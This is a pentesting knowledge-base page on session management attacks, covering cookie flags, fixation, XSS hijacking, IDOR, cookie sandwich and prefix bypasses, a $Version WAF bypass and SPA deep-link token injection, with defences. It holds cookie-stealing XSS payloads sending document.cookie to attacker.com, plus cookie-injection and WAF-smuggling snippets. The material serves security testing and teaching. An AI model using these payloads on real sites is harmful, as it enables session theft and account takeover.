---
title: "Session Management Attacks"
type: technique
tags: [authentication, exploitation, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-09-10
sources: [thm-adv-session-management, portswigger-cookie-sandwich, portswigger-cookie-chaos, portswigger-phantom-version-cookie, hacktricks-web]
---

## What it is

Session management attacks exploit weaknesses in how web applications create, track, expire, and terminate user sessions. A successful attack allows an adversary to hijack an authenticated session, impersonate a user, or maintain persistent access even after the legitimate user logs out.

## How it works

After authentication, the server issues a session token that is submitted with every subsequent request, allowing the stateless HTTP protocol to track the user. Vulnerabilities arise across the entire session lifecycle:

1. **Session Creation** — weak or predictable tokens; controllable values; fixation before authentication
2. **Session Tracking** — missing authorisation checks; tokens accepted without validation
3. **Session Expiry** — excessively long or absent expiry times
4. **Session Termination** — sessions not invalidated server-side on logout or password reset

Sessions are managed either through cookies (browser-managed, automatic submission) or tokens (JS-managed, submitted as `Authorization: Bearer`). Cookie-based sessions are subject to CSRF; token-based sessions avoid CSRF but are vulnerable to XSS if stored in `localStorage`.

## Prerequisites

- An authenticated session token to analyse (either your own account or a stolen one)
- For session fixation: access to the pre-authentication session and a method to deliver a fixed session ID to the victim
- For hijacking via XSS: an XSS vulnerability on the target application

## Methodology

### 1. Enumerate Cookie Security Flags

Inspect `Set-Cookie` headers for missing security attributes:

```http
Set-Cookie: session=12345; Secure; HttpOnly; SameSite=Strict
```

Missing flags to note:
- **No `Secure`**: cookie transmitted over HTTP; interceptable via MitM or network sniffing
- **No `HttpOnly`**: cookie readable by JavaScript; enables XSS-based theft
- **No `SameSite`**: cookie sent in cross-site requests; enables CSRF

### 2. Test Session Token Predictability

Collect multiple session tokens (create several accounts, log in/out repeatedly). Analyse for patterns:

- Simple Base64-encoded username: `base64("carlos")` → trivially reversible
- Sequential integer IDs
- Timestamps in the token value
- Concatenated static values (username + timestamp + role)

If a pattern is identified, generate tokens for other users and test them:

```python
import base64
target_session = base64.b64encode(b"admin").decode()
# Test: Cookie: session=YWRtaW4=
```

### 3. Session Fixation

Applications that create a session before authentication are vulnerable if the session ID is not rotated after login.

**Attack flow:**

1. Visit the application unauthenticated — record the pre-auth session ID
2. Deliver the session ID to the victim (via URL if the session is passed as a query parameter, or via `Set-Cookie` header injection if applicable)
3. Wait for the victim to authenticate using the fixed session ID
4. The attacker's recorded session ID is now authenticated — use it directly

**Test**: Log in and compare the session ID before and after authentication. If unchanged, fixation is possible.

### 4. Session Hijacking via XSS

If `HttpOnly` is absent, a stored or reflected XSS payload can steal the session cookie:

```javascript
document.location = 'http://attacker.com/steal?c=' + document.cookie;
```

Or using an image beacon:

```javascript
new Image().src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
```

### 5. Authorisation Bypass via Session Tracking Failures

**Vertical bypass**: Access privileged functionality without the required role. Navigate directly to admin URLs (`/admin`, `/dashboard/admin`) or add role parameters (`?admin=true`, `?role=1`) and observe whether the server enforces authorisation based on the session.

**Horizontal bypass (IDOR)**: Access another user's data by changing a user-identifying parameter while keeping your own session. Example — change the `id` parameter in `GET /account?id=1337` to another user's ID. If the server only checks that you are authenticated (not that you own that resource), the data is returned.

### 6. Session Expiry Testing

Log in and note the session token. Wait beyond what seems like a reasonable session lifetime (hours to days depending on the app). Replay the old token. If it is still accepted, expiry is either absent or excessive.

Check for mismatches between client-side expiry (cookie `Expires` attribute) and server-side expiry. A short client-side expiry with no server-side enforcement means the cookie can be reused indefinitely by setting the `Expires` header manually.

### 7. Session Termination Testing

Log out and note the session token. Attempt to replay the token on an authenticated endpoint:

```http
GET /account HTTP/1.1
Cookie: session=OLD_TOKEN_AFTER_LOGOUT
```

If the server returns the authenticated page, session tokens are not invalidated server-side. In some token-based systems (JWTs), invalidation requires a blocklist.

Also test: reset the password, then replay the old session token. Active sessions should be terminated on password reset.

## Key Payloads / Examples

Cookie flag inspection in Burp:

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123
# Missing: Secure, HttpOnly, SameSite — all exploitable
```

Session fixation URL injection (if session accepted via URL parameter):

```
https://target.com/login?sessionid=ATTACKER_FIXED_VALUE
```

XSS session theft (injected into vulnerable field):

```javascript
<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>
```

IDOR horizontal bypass:

```http
GET /api/user/profile?id=1002 HTTP/1.1
Cookie: session=YOUR_SESSION_TOKEN
# Change id from your own (1001) to victim's (1002)
```

## Cookie tossing, jar overflow, empty-name

More session-integrity primitives living in the browser/server cookie-parsing gap. Precondition for tossing (and for the prefix/sandwich attacks below): the attacker controls a subdomain or has XSS on one.

- Cookie tossing: from a subdomain set `document.cookie="session=...; domain=.example.com; Path=/specific"`. A more-specific Path or an older cookie is sent first; most apps read only the first value, letting you fixate a session/CSRF-token or hijack an OAuth flow on chosen paths.
- Cookie jar overflow: browsers cap cookies per domain; overflow the jar to evict the legit (even HttpOnly) cookie, then set your own. Used to bypass "reject two same-name cookies" defenses and to overwrite HttpOnly cookies.
- Empty-name cookie (`document.cookie="=a=b"`) lets you inject/overwrite another cookie server-side.
- The Burp bambda `CookiePrefixBypass` automates the prefix probes; cross-test browsers (Safari blocks multibyte whitespace but allows U+0085/U+00A0).

## Cookie Sandwich (HttpOnly leak via legacy parsing)

Abuses the obsolete RFC 2965 cookie syntax (`$Version`, quoted values) still honoured by many servers to "sandwich" an `HttpOnly` cookie between two attacker cookies so its value gets reflected somewhere JavaScript (or the response body) can read it - defeating the `HttpOnly` protection. Requires a way to set cookies on the victim (cookie injection via a sibling subdomain, CRLF, or an app feature that echoes a cookie). Source: PortSwigger, Axel Chong, "Stealing HttpOnly cookies with the cookie sandwich technique" (2025).

Mechanics: legacy parsers treat `$Version=1` and quoted cookie values specially. By setting a cookie whose value opens a quote and a trailing cookie that closes it, the server's cookie serializer folds the real `HttpOnly` session cookie into a value later reflected (error page, debug endpoint, header echo).

```http
# attacker-set cookies surrounding the victim HttpOnly cookie:
Cookie: $Version=1; sandwich="; session=<HttpOnly value pulled in here>; x="
```

Hunting:
- Find a cookie-reflection sink (error message, search history, "your cookies" debug view, header echo via [[http-host-header-attacks]] or [[crlf-injection]]).
- Find a cookie-injection primitive (subdomain XSS, CRLF response splitting, or a parameter written to `Set-Cookie`).
- Confirm legacy `$Version`/quoted-value parsing is honoured (Tomcat, some Java/PHP stacks), then sandwich and read the leaked session.

Defence: reject `$Version`/quoted cookie syntax; do not reflect raw cookie headers; scope cookies tightly; isolate subdomains.

## Cookie prefix bypass (`__Host-` / `__Secure-`)

The `__Host-` and `__Secure-` name prefixes are a browser-enforced integrity guarantee: a browser will only *store* a `__Secure-` cookie if it has the `Secure` flag, and a `__Host-` cookie only if it is `Secure`, has no `Domain`, has `Path=/`, and was set over HTTPS. Servers therefore treat a `__Host-session` cookie as host-locked and un-overridable by subdomains. "Cookie Chaos" (Axel Chong, PortSwigger, 2025) breaks that assumption with a parser mismatch: the attacker sets a cookie the **browser** accepts as a different, non-prefixed name (so prefix rules never fire), while the **server** normalises it back to the protected `__Host-`/`__Secure-` name. Requires a cookie-injection primitive (sibling-subdomain XSS, [[crlf-injection]], or an app feature writing to `Set-Cookie`), same as the Cookie Sandwich.

**Mechanism 1: Unicode-whitespace normalisation.** Prepend a Unicode space (U+2000, or U+00A0) to the name. The browser sees a leading-whitespace name, not a valid prefix, and stores it with no prefix enforcement; server frameworks strip the whitespace and recover the prefix. Django (`str.strip()` on keys) and ASP.NET (trim) are affected:

```javascript
// U+2000 hides the prefix from the browser; Django/.NET .strip() reveals __Host-name server-side
document.cookie = `${String.fromCodePoint(0x2000)}__Host-session=attacker; Domain=.example.com; Path=/;`
```

**Mechanism 2: legacy `$Version` split.** On Java stacks (Tomcat, Jetty), a leading `$Version=1` switches the parser to RFC 2965 mode, which splits one cookie string into several. The injected `__Host-` name survives on the server without the browser ever applying prefix validation:

```javascript
document.cookie = `$Version=1,__Host-session=attacker; Path=/x/; Domain=.example.com;`
```

When two cookies of the same name reach the server, the attacker-set value typically wins, giving session fixation or an auth bypass against code that trusts the `__Host-` prefix.

**Phantom `$Version` WAF bypass.** The same `$Version` legacy trigger also splits WAF from backend. "Bypassing WAFs with the phantom $Version cookie" (PortSwigger, 2025): a cookie header starting with `$Version=1` makes Tomcat / Spring Boot fall back to RFC 2109 parsing, which honours quoted values and escape sequences. A WAF parsing RFC 6265 either ignores the legacy syntax or never unwraps the quotes, so a payload hidden inside a quoted value reaches the app unfiltered:

```http
# Blocked (plain):
Cookie: name=eval('test')
# Passes the WAF, parsed by Tomcat as name=eval('test'):
Cookie: $Version=1; name="eval('test')"
```

AWS WAF and similar do not recognise the RFC 2109 format, so quoted cookie values become a general smuggling channel for SQLi/XSS/command payloads that plain cookie inspection would block.

Defence: reject `$Version`/legacy cookie syntax at the edge; normalise Unicode and trim cookie names *before* prefix validation, or reject names containing whitespace; do not treat prefix names as trusted without re-checking the attributes server-side.

## Bypasses and Variants

| Vulnerability | Impact |
|---|---|
| Predictable session ID | Enumerate valid sessions; impersonate users |
| Session fixation | Force victim onto a known session ID |
| Missing HttpOnly | XSS-based cookie theft |
| Missing Secure | Network-level interception (MitM, HTTP downgrade) |
| Missing SameSite | CSRF: browser auto-submits cookie in cross-site requests |
| No server-side expiry | Stolen tokens remain valid indefinitely |
| No server-side logout invalidation | Persistent access after victim logs out |
| Excessive expiry | Long window of opportunity for replayed stolen tokens |

**Insecure SSO redirect**: In SSO environments, if post-authentication redirect targets are attacker-controllable, session material transmitted during the redirect can be hijacked.

## Detection and Defence

- Set `Secure`, `HttpOnly`, and `SameSite=Strict` (or `Lax`) on all session cookies
- Generate session IDs with a cryptographically secure PRNG; minimum 128 bits entropy
- Rotate the session ID immediately after authentication (prevents fixation)
- Implement server-side session expiry appropriate to the application's sensitivity (banking: minutes; webmail: hours)
- Invalidate sessions server-side on logout and password reset
- Detect abnormal session reuse patterns (IP/User-Agent changes mid-session)
- Log all requests (including accepted ones) with their associated session to support incident investigation

## Tools

- [[burp-suite]] — session analysis, cookie flag inspection, Intruder for IDOR enumeration
- OWASP ZAP — active scan for session management weaknesses
- Browser DevTools — inspect cookie attributes in the Application tab

## Proving a fixated session is real, not just accepted

A server returning no `Set-Cookie` when handed an unknown client-supplied session id shows only that the value was adopted syntactically. To prove it is a genuinely live, stateful server-side session: fetch something under that id that writes state server-side (e.g. a CAPTCHA image, which stores its expected answer keyed to the session), then submit that value back under the same attacker-chosen id and confirm it validates. Acceptance proves the session is real and attacker-controlled, not merely tolerated.

Also test URL-based fixation delivery (`?PHPSESSID=...` / `session.use_trans_sid`) as a SEPARATE, independently-disableable vector from cookie-based fixation: a server can reject the URL form while still accepting the cookie form, which changes the realistic delivery mechanism (needs a cookie-write primitive like XSS or a lenient SameSite, not a bare link).


## HSTS `max-age=0` is a worse-than-absent policy, not a missing one

`Strict-Transport-Security: max-age=0` does not merely fail to enable HSTS, it actively instructs the browser to FORGET any HSTS policy it previously cached for that host. A user who was previously protected loses that protection on their very next visit. Combined with `includeSubDomains`, the same forget-instruction propagates to every sibling host under the domain.

Chained with a session cookie issued without `Secure`, this becomes a demonstrable cleartext-exposure primitive rather than a theoretical one: the browser has no upgrade instruction, so it attaches the cookie to a plaintext `http://` request, and the server's eventual redirect to HTTPS arrives after the `Cookie:` header already crossed the network. Prove it live: `curl -sI https://host/` for the header, `curl -s -c jar https://host/` then grep the jar for `secure=FALSE`, then `curl -s -b jar -v http://host/` and show the `Cookie:` line inside the plaintext transcript.

Audit takeaway: grep security-header scans specifically for `max-age=0`, not just header presence/absence; a scanner checking presence alone reports this host as compliant.

## SPA deep-link token injection: URL params adopted as auth credentials client-side

Modern hybrid SPAs (web + mobile from one bundle) sometimes implement cross-context handoff — SSO return, app-link continuation, support or observation hops — by passing credential material IN the link: a base64/JSON blob in a `hash`/`token`/`data` query param or custom-scheme URL. The failure shape: the handler decodes it (`atob` + `JSON.parse`) and dispatches it straight into the auth store (logout + "update user token" style reducer), with the fields becoming the `Authorization: Bearer` credential for every API call AND the refresh token replayed to the token endpoint. Zero validation anywhere in the chain: no signature/JWT verify library in the bundle, no expiry check (expiry is client arithmetic from an attacker-chosen `expires_in`), no origin binding. Result: attacker-crafted links fixate the victim's session to attacker-controlled tokens (session fixation / forced session swap); the reverse direction exfiltrates anything the victim enters while believing they are in their own account.

Hunt recipe (offline, no target contact needed for the first pass):
- Linking config in the bundle: grep for `prefixes:[` / custom-scheme literals (`myapp://`) — lists every URL shape the app claims.
- Custom `getStateFromPath` / `parse` overrides on the router: every opened URL transits them; check for raw `String.includes("/route")` substring triggers (no registered route needed — any path containing the substring fires).
- The consumption chain: `atob(` followed by `JSON.parse(` followed by a dispatch into the auth reducer. Read the FULL path between parse and dispatch; absence of a verify step is the finding.
- Zero-validation negative (make it strong): case-insensitive grep for `jwt|jose|verifySignature|jsonwebtoken` across the whole bundle = 0 hits; the trigger route string occurs exactly once (the handler itself); the action name occurs only at creator + reducer.
- Persistence: check redux-persist storage adapters — on web the adapter is often COOKIE-backed (`document.cookie` get/set with TTL), not localStorage; the injected token survives reload either way.

Transport confirmation (GET-only, canary-safe): fire the crafted URL with a benign canary blob; a 200 app shell with identical headers vs a no-hash control proves the param transits the edge unfiltered and consumption is entirely client-side. Server never evaluates the hash (same bytes back either way).

Attack surface detail: the handler chain typically performs two dispatches back to back, a forced logout of the current session followed by installation of the URL-borne credential object as the new session. Both fire on page load with no consent step, so one link click (or custom-scheme open) simultaneously destroys the victim's real session and replaces it with the attacker-chosen one. Two attacker-token classes set the severity ceiling: an own-account pair yields account confusion and a phishing surface (the victim transacts inside an account the attacker also controls) with no privilege escalation by itself; a pair harvested elsewhere turns the gadget into full session fixation against a victim the attacker does not control. The expiry field is consumed as raw seconds into client-side date arithmetic, so the attacker also chooses how long the injected session persists client-side.

Malformed payload = router crash (nuisance DoS): because the decode sits inside the router's path-parsing routine with no error handling, a payload that is invalid base64 or invalid JSON throws unhandled during URL handling and crashes the app on link open. Any user who opens the crafted link, including a reload of the poisoned URL, hits the crash; no valid token is needed. Test with a canary whose length is not a multiple of 4 (never valid base64) before touching any real-token scenario.

Persistence varies by build; read the storage shim instead of assuming: the injected credential object can land in `localStorage` under a `persist:`-prefixed key just as well as in the cookie-backed adapter. Read the actual storage config in the bundle and name the real landing zone; the injected session survives reload either way.

Related pattern, hash-borne consent auto-confirm: same source class (URL segment carried into app state), different sink. A server-issued confirmation hash from the URL is written into persisted state and a screen effect auto-fires the authenticated confirm/accept API call on mount, with response errors swallowed and the hash cleared afterwards. There is no in-app prompt: the link click IS the consent action, making this a consent-bypass amplifier rather than a fixation primitive. Standalone impact is INFO/LOW unless a live victim-issued hash reaches the attacker; escalation testing (does the endpoint accept a hash issued for a different grant context?) requires explicit authorization.

Falsifiable test recipe (canary-first, own-account-only):

1. Reach, zero side effects: fire the crafted deep link with a benign canary in the credential parameter (invalid-base64 length). Expected if reachable: the app shell returns 200 with headers identical to a no-param control (consumption is purely client-side; the server never evaluates the value) and the client errors on parse. Record both fetches raw.
2. Crash class: the canary above reproducing an unhandled client exception on link open confirms the nuisance-DoS subclass without any account (browser required; curl only proves the transport shape).
3. Install class (own account ONLY): base64-encode a JSON object shaped like the app's credential payload, carrying a sentinel-marked token pair from an account you own. Open the link logged in as that same account. Confirm: old session logged out, sentinel session installed (visible in the persisted storage key), and the sentinel `Authorization: Bearer` value on subsequent API calls. Never use a token pair belonging to anyone else.
4. STOP criteria: any sign of another real account's data, any harvested or victim-owned token in play, any endpoint accepting the injected token cross-account, or any server-side rejection that would log the attempt as abuse. Stop, capture, report; do not chain further without an explicit owner decision.

Detection addition: adjacent-triplet grep over the bundle, `atob(` near `JSON.parse(` near an auth-action dispatch (`logout`, `setToken`, `signIn` shapes). Every hit needs the full path read between parse and dispatch; the trigger route string occurring exactly once (only at the handler) plus the action name occurring only at creator + reducer confirms no second validation site. Run this sweep together with the substring-trigger and zero-validation checks above.

Remediation: signed, short-TTL, single-use, server-issued opaque hash resolved server-side; never raw token material in URLs; register the route instead of substring matching; strip consumed params. Additions:
- Server-bound one-time exchange codes instead of raw token material in URLs: the URL carries an opaque short-TTL single-use code the client exchanges server-to-server for the real session.
- Validate token identity against the session server-side (issuer, subject, and audience binding) before honoring any client-supplied credential object, even one delivered through a legitimate handoff.
- Fail closed on parse errors: wrap the decode in error handling so a malformed parameter can never throw inside the router; strip the consumed parameter after use.

## Sources

- TryHackMe: Session Management room
- Axel Chong / PortSwigger, "Cookie Chaos: how to bypass __Host- and __Secure- cookie prefixes" (2025) (slug: portswigger-cookie-chaos).
- PortSwigger, "Bypassing WAFs with the phantom $Version cookie" (2025) (slug: portswigger-phantom-version-cookie).

<!-- promoted-slug: to-prove-a-session-fixation-primitive-is-genuinely-live-and -->

<!-- promoted-slug: hsts-max-age-0-is-not-a-missing-policy-but-an-actively-worse -->
